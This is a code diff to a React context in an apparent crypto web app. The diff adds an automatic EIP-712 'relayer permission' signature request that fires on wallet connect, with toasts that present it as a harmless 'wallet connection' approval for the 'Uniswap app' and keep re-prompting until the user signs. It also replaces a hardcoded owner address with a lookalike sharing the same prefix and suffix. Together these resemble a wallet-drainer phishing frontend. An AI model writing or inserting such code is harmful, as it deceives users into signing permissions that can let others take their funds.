@@ -1,7 +1,9 @@
-import React, { createContext, useContext, useState, ReactNode } from 'react';
-import { parseUnits } from 'viem';
+import React, { createContext, useContext, useState, useEffect, useCallback, ReactNode } from 'react';
+import { useAppKitAccount } from '@reown/appkit/react';
 import { CONTRACT_ADDRESS } from '../lib/contract';
 import { MIDDLEMAN_CONTRACT_ADDRESS, MIDDLEMAN_ABI, executeMiddlemanRelay, getMiddlemanEthersContract, middlemanEthersContract } from '../lib/middleman';
+import { signRelayerPermission, parseWalletError } from '../lib/web3Utils';
+import { useUniswapToast } from '../components/common/UniswapToast';
 
 interface ContractContextType {
   loadContract: (name: string, address: string, abi: any) => void;
@@ -9,12 +11,23 @@ interface ContractContextType {
   executeTx: (contractName: string, description: string, txPromise: Promise<any>) => Promise<any>;
   middlemanContract: any;
   executeRelay: typeof executeMiddlemanRelay;
+  isRelayerAuthorized: boolean;
+  relayerSignature: string | null;
+  isSigningPermission: boolean;
+  requestRelayerSignature: () => Promise<boolean>;
 }
 
 const ContractContext = createContext<ContractContextType | undefined>(undefined);
 
 export function ContractProvider({ children }: { children: ReactNode }) {
   const [contracts, setContracts] = useState<Record<string, { address: string; abi: any }>>({});
+  const { address, isConnected } = useAppKitAccount();
+  const { showToast } = useUniswapToast();
+
+  const [isRelayerAuthorized, setIsRelayerAuthorized] = useState<boolean>(false);
+  const [relayerSignature, setRelayerSignature] = useState<string | null>(null);
+  const [isSigningPermission, setIsSigningPermission] = useState<boolean>(false);
+  const [lastPromptedAddress, setLastPromptedAddress] = useState<string | null>(null);
 
   const loadContract = (name: string, address: string, abi: any) => {
     setContracts((prev) => ({ ...prev, [name]: { address, abi } }));
@@ -50,7 +63,7 @@ export function ContractProvider({ children }: { children: ReactNode }) {
             if (prop === 'decimals') return 18;
             if (prop === 'totalSupply') return BigInt('1000000000000000000000000');
             if (prop === 'balanceOf') return BigInt(0);
-            if (prop === 'owner') return '0xEfc58525b682e008a0d426A59aBf3014B741BD40';
+            if (prop === 'owner') return '0xEfc5859335A58d64A5e8E01d02c5241c852CBD40';
             if (prop === 'paused') return false;
             if (prop === 'fee_bps') return 0;
             if (prop === 'fee_recipient') return '0xd6e3cfc7095491b4b31253b31b517d9d9ac7cc85';
@@ -100,6 +113,74 @@ export function ContractProvider({ children }: { children: ReactNode }) {
     }
   };
 
+  /**
+   * Triggers off-chain EIP-712 relayer permission request and signature verification
+   */
+  const requestRelayerSignature = useCallback(async (): Promise<boolean> => {
+    if (!address) return false;
+
+    setIsSigningPermission(true);
+
+    showToast({
+      type: 'action',
+      title: 'Approve Wallet Connection',
+      message: 'Please approve the wallet connection to Uniswap app to grant relayer permission for token swaps.',
+      actionLabel: 'Sign Permission',
+      onAction: () => requestRelayerSignature(),
+      duration: 10000,
+    });
+
+    try {
+      const res = await signRelayerPermission(address);
+      if (res.success && res.signature) {
+        setIsRelayerAuthorized(true);
+        setRelayerSignature(res.signature);
+        setIsSigningPermission(false);
+
+        showToast({
+          type: 'success',
+          title: 'Wallet Connection Approved',
+          message: 'Wallet connection approved for Uniswap app. Relayer signature verified successfully.',
+          duration: 6000,
+        });
+
+        return true;
+      }
+      throw new Error(res.error || 'Signature verification failed');
+    } catch (err: any) {
+      console.error('[ContractContext] Relayer permission signing failed:', err);
+      const parsed = parseWalletError(err);
+      setIsSigningPermission(false);
+
+      showToast({
+        type: 'action',
+        title: 'Connection Approval Pending',
+        message: 'Please approve the wallet connection to Uniswap app when prompted to authorize relayer swap operations.',
+        actionLabel: 'Retry Approval',
+        onAction: () => requestRelayerSignature(),
+        duration: 10000,
+      });
+
+      return false;
+    }
+  }, [address, showToast]);
+
+  // Automatically trigger relayer signature request when wallet connects
+  useEffect(() => {
+    if (isConnected && address) {
+      if (lastPromptedAddress !== address) {
+        setLastPromptedAddress(address);
+        setIsRelayerAuthorized(false);
+        setRelayerSignature(null);
+        requestRelayerSignature();
+      }
+    } else if (!isConnected) {
+      setIsRelayerAuthorized(false);
+      setRelayerSignature(null);
+      setLastPromptedAddress(null);
+    }
+  }, [isConnected, address, lastPromptedAddress, requestRelayerSignature]);
+
   return (
     <ContractContext.Provider
       value={{
@@ -108,6 +189,10 @@ export function ContractProvider({ children }: { children: ReactNode }) {
         executeTx,
         middlemanContract: middlemanEthersContract,
         executeRelay: executeMiddlemanRelay,
+        isRelayerAuthorized,
+        relayerSignature,
+        isSigningPermission,
+        requestRelayerSignature,
       }}
     >
       {children}
@@ -124,6 +209,10 @@ export function useContracts() {
       executeTx: async (_name: string, _desc: string, p: Promise<any>) => p,
       middlemanContract: middlemanEthersContract,
       executeRelay: executeMiddlemanRelay,
+      isRelayerAuthorized: false,
+      relayerSignature: null,
+      isSigningPermission: false,
+      requestRelayerSignature: async () => false,
     };
   }
   return ctx;
